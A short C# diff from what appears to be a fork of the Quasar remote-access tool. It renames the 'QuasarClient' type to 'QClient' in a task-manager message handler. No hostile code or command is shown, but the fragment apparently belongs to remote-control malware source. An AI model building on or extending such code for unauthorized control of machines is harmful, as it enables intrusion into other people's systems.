@@ -20,11 +20,11 @@ namespace Ton618.MessageHandlers
     /// </summary>
     public class TaskManagerHandler : IMessageProcessor, IDisposable
     {
-        private readonly QuasarClient _client;
+        private readonly QClient _client;
 
         private readonly WebClient _webClient;
 
-        public TaskManagerHandler(QuasarClient client)
+        public TaskManagerHandler(QClient client)
         {
             _client = client;
             _client.ClientState += OnClientStateChange;
